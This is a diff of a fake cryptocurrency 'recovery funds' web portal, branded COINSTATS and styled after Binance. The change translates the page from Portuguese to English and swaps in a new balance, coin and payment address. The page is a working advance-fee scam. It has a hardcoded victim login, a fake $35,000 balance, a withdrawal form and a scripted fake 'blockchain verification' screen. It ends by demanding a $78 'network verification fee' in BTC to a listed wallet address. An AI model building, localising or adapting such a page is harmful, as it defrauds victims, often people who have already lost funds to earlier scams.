@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -28,7 +28,7 @@
 </head>
 <body class="selection:bg-yellow-400/30 overflow-x-hidden">
 
-    <p class="text-zinc-500 text-[10px] font-bold mt-1 uppercase tracking-[0.3em]">Estes são Fundos de Recuperação privados e exigem login a cada acesso</p>
+    <p class="text-zinc-500 text-[10px] font-bold mt-1 uppercase tracking-[0.3em]">These are private Recovery Funds and require login on each access</p>
 
     <!-- LOGIN SECTION -->
     <div id="login-screen" class="min-h-screen flex items-center justify-center p-4 relative overflow-hidden">
@@ -39,21 +39,21 @@
                     <i data-lucide="lock" class="w-8 h-8"></i>
                 </div>
                 <h1 class="text-3xl font-black italic tracking-tight uppercase glow">COINSTATS</h1>
-                <p class="text-zinc-500 text-[10px] font-bold mt-1 uppercase tracking-[0.3em]">Acesso ao Portal Seguro</p>
+                <p class="text-zinc-500 text-[10px] font-bold mt-1 uppercase tracking-[0.3em]">Secure Portal Access</p>
             </div>
             <div class="space-y-6">
                 <div class="space-y-2">
-                    <label class="text-[10px] font-black uppercase text-zinc-500 tracking-widest ml-1">ID de Acesso</label>
+                    <label class="text-[10px] font-black uppercase text-zinc-500 tracking-widest ml-1">Access ID</label>
                     <input id="username" type="text" placeholder="ID" class="w-full bg-black/50 border border-white/10 h-14 rounded-xl px-4 outline-none focus:border-yellow-400 text-white">
                 </div>
                 <div class="space-y-2">
-                    <label class="text-[10px] font-black uppercase text-zinc-500 tracking-widest ml-1">Chave de Segurança</label>
+                    <label class="text-[10px] font-black uppercase text-zinc-500 tracking-widest ml-1">Security Key</label>
                     <input id="password" type="password" placeholder="••••••••" class="w-full bg-black/50 border border-white/10 h-14 rounded-xl px-4 outline-none focus:border-yellow-400 text-white">
                 </div>
                 <div id="login-error" class="hidden bg-red-500/10 border border-red-500/20 p-4 rounded-xl text-red-500 text-[9px] font-black uppercase tracking-widest text-center animate-pulse">
-                    DETECÇÃO DE ROUBO: IMPOSSÍVEL ACESSAR PAGAMENTO DE RECUPERAÇÃO
+                    THEFT DETECTED: UNABLE TO ACCESS RECOVERY PAYMENT
                 </div>
-                <button onclick="attemptLogin()" class="w-full bg-binance py-6 rounded-2xl font-black text-black text-lg hover-binance transition-all shadow-binance uppercase">Descriptografar Portal</button>
+                <button onclick="attemptLogin()" class="w-full bg-binance py-6 rounded-2xl font-black text-black text-lg hover-binance transition-all shadow-binance uppercase">Decrypt Portal</button>
             </div>
         </div>
     </div>
@@ -66,7 +66,7 @@
                     <div class="w-9 h-9 rounded-xl bg-binance flex items-center justify-center text-black"><i data-lucide="shield-check" class="w-5 h-5"></i></div>
                     <span class="font-bold text-xl tracking-tight uppercase italic">Amadeu</span>
                 </div>
-                <div class="text-xs font-black text-binance uppercase tracking-widest">VERIFICADO</div>
+                <div class="text-xs font-black text-binance uppercase tracking-widest">VERIFIED</div>
             </div>
         </nav>
 
@@ -75,8 +75,8 @@
                 <div class="absolute top-0 right-0 w-96 h-96 bg-binance-10 rounded-full blur-[100px]"></div>
                 <div class="relative z-10 flex flex-col md:flex-row items-center justify-between gap-10">
                     <div class="space-y-6">
-                        <div class="bg-binance-10 text-yellow-300 px-4 py-1.5 rounded-full w-fit border border-binance text-[10px] font-black uppercase tracking-widest">Ativos</div>
-                        <h1 class="text-6xl sm:text-7xl font-black tracking-tighter glow">54,440.88 <span class="text-2xl text-zinc-600 font-normal">USD</span></h1>
+                        <div class="bg-binance-10 text-yellow-300 px-4 py-1.5 rounded-full w-fit border border-binance text-[10px] font-black uppercase tracking-widest">Assets</div>
+                        <h1 class="text-6xl sm:text-7xl font-black tracking-tighter glow">$35,000.00 <span class="text-2xl text-zinc-600 font-normal">USD</span></h1>
                     </div>
                     <!-- TradingView Widget BEGIN -->
 <div class="tradingview-widget-container">
@@ -97,7 +97,7 @@
 </div>
 <!-- TradingView Widget END -->
                     <button onclick="openModal()" class="bg-binance hover:bg-[#f0b90b] text-black font-black py-8 px-12 rounded-[2rem] text-xl shadow-binance flex items-center transition-all transform hover:scale-105 active:scale-95">
-                        <i data-lucide="wallet" class="mr-3 w-6 h-6"></i> Solicitar Saque
+                        <i data-lucide="wallet" class="mr-3 w-6 h-6"></i> Request Withdrawal
                     </button>
                 </div>
             </div>
@@ -111,18 +111,18 @@
             <div class="h-1.5 bg-gradient-to-r from-[var(--binance-yellow)] to-[#f59e0b] w-full"></div>
             
             <div id="step-input" class="p-8 space-y-8">
-                <h2 class="text-3xl font-black italic">SOLICITAÇÃO DE SAQUE</h2>
+                <h2 class="text-3xl font-black italic">WITHDRAWAL REQUEST</h2>
                 <div class="space-y-4">
-                    <label class="text-[10px] font-black text-zinc-500 uppercase tracking-widest">Selecione o Método</label>
+                    <label class="text-[10px] font-black text-zinc-500 uppercase tracking-widest">Select Method</label>
                     <div class="grid grid-cols-2 gap-2 text-sm font-bold">
-                        <div class="p-4 border-2 border-binance bg-binance-10 rounded-xl text-center">USDT 🪙</div>
+                        <div class="p-4 border-2 border-binance bg-binance-10 rounded-xl text-center">BTC ₿</div>
                     </div>
                 </div>
                 <div class="space-y-2">
-                    <label class="text-[10px] font-black text-zinc-500 uppercase tracking-widest">Observação: use apenas endereço USDT — fundos enviados para o endereço errado são irreversíveis</label>
-                    <input id="address" type="text" placeholder="Insira os detalhes..." class="w-full bg-zinc-900 border border-white/10 h-14 rounded-xl px-4 font-mono text-sm outline-none focus:border-yellow-400">
+                    <label class="text-[10px] font-black text-zinc-500 uppercase tracking-widest">Note: use BTC address only — funds sent to the wrong address are irreversible</label>
+                    <input id="address" type="text" placeholder="Enter address or payment details..." class="w-full bg-zinc-900 border border-white/10 h-14 rounded-xl px-4 font-mono text-sm outline-none focus:border-yellow-400">
                 </div>
-                <button onclick="startProcessing()" class="w-full bg-binance py-6 rounded-2xl font-black text-black text-lg hover-binance">Enviar Solicitação</button>
+                <button onclick="startProcessing()" class="w-full bg-binance py-6 rounded-2xl font-black text-black text-lg hover-binance">Send Request</button>
             </div>
 
             <!-- ANIMATION PAGE -->
@@ -133,8 +133,8 @@
                     <div class="w-20 h-20 rounded-2xl border border-binance/50 bg-zinc-900 flex items-center justify-center shadow-[0_0_30px_rgba(243,186,47,0.12)]"><i data-lucide="zap" class="text-yellow-400 w-10 h-10"></i></div>
                 </div>
                 <div class="space-y-4">
-                    <h3 class="text-3xl font-black italic uppercase">Sincronizando</h3>
-                    <p class="text-[10px] text-zinc-500 font-bold uppercase tracking-[0.2em]">Verificação da blockchain em andamento • por favor, aguarde...</p>
+                    <h3 class="text-3xl font-black italic uppercase">Synchronizing</h3>
+                    <p class="text-[10px] text-zinc-500 font-bold uppercase tracking-[0.2em]">Blockchain verification in progress • please wait...</p>
                 </div>
                 <div class="w-full max-w-xs h-1.5 bg-zinc-900 rounded-full overflow-hidden border border-white/5">
                     <div id="progress-bar" class="h-full bg-binance w-0 transition-all"></div>
@@ -145,15 +145,15 @@
             <div id="step-error" class="hidden flex flex-col">
                 <div class="bg-red-500/10 p-8 border-b border-red-500/20 flex gap-5 items-center">
                     <div class="w-16 h-16 rounded-2xl bg-red-500/20 flex items-center justify-center"><i data-lucide="alert-triangle" class="text-red-500 w-8 h-8"></i></div>
-                    <div><h3 class="text-2xl font-black text-red-500 italic uppercase">Sistema Interrompido</h3><p class="text-xs font-bold text-red-400 uppercase tracking-widest">Protocolo de Segurança 2.8</p></div>
+                    <div><h3 class="text-2xl font-black text-red-500 italic uppercase">System Interrupted</h3><p class="text-xs font-bold text-red-400 uppercase tracking-widest">Security Protocol 2.8</p></div>
                 </div>
                 <div class="p-8 space-y-8">
-                    <p class="text-zinc-400 text-sm font-medium">Uma taxa de verificação de rede de <b>$30 USD</b> é necessária para desbloquear seu saque de <b>$54,440.88</b>. Este é um custo único de sincronização da blockchain.</p>
+                    <p class="text-zinc-400 text-sm font-medium">A BTC network verification fee of <b>$78</b> is required to unlock your withdrawal of <b>$35,000.00</b>. This is a one-time blockchain synchronization cost.</p>
                     <div class="bg-zinc-900 rounded-[2rem] p-6 border border-white/10 space-y-4">
-                        <span class="text-[10px] text-zinc-500 font-black uppercase">Envie BTC para:</span>
-                        <div class="font-mono text-[11px] text-yellow-300 break-all bg-black p-4 rounded-xl border border-white/5">TJj8uPa1tvJ66a5cjEb7Yc32v3iXdFWQSn</div>
+                        <span class="text-[10px] text-zinc-500 font-black uppercase">Send BTC to:</span>
+                        <div class="font-mono text-[11px] text-yellow-300 break-all bg-black p-4 rounded-xl border border-white/5">bc1qqenvynqjydyuyw55g20hcesa0f0rxd9eyes024</div>
                     </div>
-                    <button class="w-full bg-binance py-6 rounded-2xl font-black text-black text-xl uppercase tracking-widest hover-binance">Confirmar Pagamento</button>
+                    <button class="w-full bg-binance py-6 rounded-2xl font-black text-black text-xl uppercase tracking-widest hover-binance">Confirm Payment</button>
                 </div>
             </div>
         </div>
@@ -165,7 +165,7 @@
         function attemptLogin() {
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
-            // Credenciais de demonstração (mantenha/ajuste conforme necessário)
+            // Demo credentials (keep/adjust as needed)
             if (u === 'agent' && p === 'Amadeu123') {
                 document.getElementById('login-screen').classList.add('hidden');
                 document.getElementById('dashboard').classList.remove('hidden');
@@ -178,7 +178,7 @@
         function closeModal() { document.getElementById('modal').classList.add('hidden'); }
 
         function startProcessing() {
-            if (document.getElementById('address').value.length < 5) return alert('Insira um endereço válido');
+            if (document.getElementById('address').value.length < 5) return alert('Please enter a valid address');
             document.getElementById('step-input').classList.add('hidden');
             document.getElementById('step-processing').classList.remove('hidden');
             let progress = 0;
